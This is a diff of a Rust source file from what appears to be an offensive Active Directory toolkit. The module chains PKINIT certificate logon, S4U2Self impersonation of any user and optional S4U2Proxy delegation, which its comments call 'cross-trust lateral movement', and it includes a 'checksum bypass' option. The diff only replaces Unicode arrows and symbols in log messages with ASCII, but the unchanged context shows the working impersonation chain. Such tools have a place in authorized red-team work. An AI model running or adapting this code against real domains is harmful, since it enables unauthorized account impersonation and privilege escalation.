@@ -2,9 +2,9 @@
 //!
 //! Performs certificate-based S4U2Self delegation for cross-trust lateral movement.
 //! This chain allows:
-//! 1. Authenticate via PKINIT (client certificate) → obtain TGT
-//! 2. Use TGT for S4U2Self → impersonate any user to self
-//! 3. Optionally chain to S4U2Proxy → access target service
+//! 1. Authenticate via PKINIT (client certificate) -> obtain TGT
+//! 2. Use TGT for S4U2Self -> impersonate any user to self
+//! 3. Optionally chain to S4U2Proxy -> access target service
 //!
 //! Use case: When you have a user's PKINIT certificate but need to
 //! impersonate other users or access services across trust boundaries.
@@ -32,7 +32,7 @@ pub struct S4U2SelfPkinitConfig {
     /// User to impersonate via S4U2Self
     pub impersonate_user: String,
     /// Target SPN for S4U2Proxy (optional)
-    /// If set, chains S4U2Self → S4U2Proxy
+    /// If set, chains S4U2Self -> S4U2Proxy
     pub target_spn: Option<String>,
     /// Enable checksum bypass for constrained delegation
     /// May be required for some delegation configurations
@@ -71,7 +71,7 @@ pub struct S4U2SelfPkinitResult {
 /// Execute S4U2Self with PKINIT authentication chain
 pub async fn run_s4u2self_pkinit(config: &S4U2SelfPkinitConfig) -> Result<S4U2SelfPkinitResult> {
     info!(
-        "Starting S4U2Self+PKINIT chain: {}@{} → {} → {:?}",
+        "Starting S4U2Self+PKINIT chain: {}@{} -> {} -> {:?}",
         config.username, config.domain, config.impersonate_user, config.target_spn
     );
 
@@ -106,12 +106,12 @@ pub async fn run_s4u2self_pkinit(config: &S4U2SelfPkinitConfig) -> Result<S4U2Se
     {
         Ok(tgt) => {
             result.pkinit_success = true;
-            info!("  ✓ PKINIT authentication succeeded");
+            info!("  [+] PKINIT authentication succeeded");
             tgt
         }
         Err(e) => {
             result.error = Some(format!("PKINIT authentication failed: {}", e));
-            warn!("  ✗ PKINIT failed: {}", e);
+            warn!("  [-] PKINIT failed: {}", e);
             return Ok(result);
         }
     };
@@ -135,12 +135,12 @@ pub async fn run_s4u2self_pkinit(config: &S4U2SelfPkinitConfig) -> Result<S4U2Se
         {
             Ok((ticket, had_bypass)) => {
                 result.s4u2self_success = true;
-                info!("  ✓ S4U2Self succeeded (checksum bypass: {})", had_bypass);
+                info!("  [+] S4U2Self succeeded (checksum bypass: {})", had_bypass);
                 ticket
             }
             Err(e) => {
                 result.error = Some(format!("S4U2Self failed: {}", e));
-                warn!("  ✗ S4U2Self failed: {}", e);
+                warn!("  [-] S4U2Self failed: {}", e);
                 return Ok(result);
             }
         }
@@ -149,12 +149,12 @@ pub async fn run_s4u2self_pkinit(config: &S4U2SelfPkinitConfig) -> Result<S4U2Se
         match kerberos::s4u2self(&config.dc_ip, &tgt, &config.impersonate_user).await {
             Ok(ticket) => {
                 result.s4u2self_success = true;
-                info!("  ✓ S4U2Self succeeded");
+                info!("  [+] S4U2Self succeeded");
                 ticket
             }
             Err(e) => {
                 result.error = Some(format!("S4U2Self failed: {}", e));
-                warn!("  ✗ S4U2Self failed: {}", e);
+                warn!("  [-] S4U2Self failed: {}", e);
                 return Ok(result);
             }
         }
@@ -174,11 +174,11 @@ pub async fn run_s4u2self_pkinit(config: &S4U2SelfPkinitConfig) -> Result<S4U2Se
                 } else {
                     "Unknown".to_string()
                 };
-                info!("  ✓ S4U2Proxy succeeded for {}", target_spn);
+                info!("  [+] S4U2Proxy succeeded for {}", target_spn);
             }
             Err(e) => {
                 result.error = Some(format!("S4U2Proxy failed: {}", e));
-                warn!("  ✗ S4U2Proxy failed for {}: {}", target_spn, e);
+                warn!("  [-] S4U2Proxy failed for {}: {}", target_spn, e);
                 // S4U2Self succeeded but S4U2Proxy failed
                 // Return partial success with S4U2Self ticket
                 result.final_ticket_data = s4u_ticket.ticket.enc_part.cipher.clone();
@@ -211,11 +211,11 @@ pub async fn run_s4u2self_pkinit(config: &S4U2SelfPkinitConfig) -> Result<S4U2Se
 
     if result.chain_success {
         info!(
-            "  ✓ Full chain succeeded: {} → {} → {:?}",
+            "  [+] Full chain succeeded: {} -> {} -> {:?}",
             config.username, config.impersonate_user, config.target_spn
         );
     } else {
-        warn!("  ⚠ Chain partially succeeded (check individual step results)");
+        warn!("  [!] Chain partially succeeded (check individual step results)");
     }
 
     Ok(result)
@@ -243,7 +243,7 @@ pub async fn s4u2self_pkinit_only(
     run_s4u2self_pkinit(&config).await
 }
 
-/// Full chain: PKINIT → S4U2Self → S4U2Proxy
+/// Full chain: PKINIT -> S4U2Self -> S4U2Proxy
 pub async fn s4u2self_pkinit_with_proxy(
     dc_ip: &str,
     domain: &str,
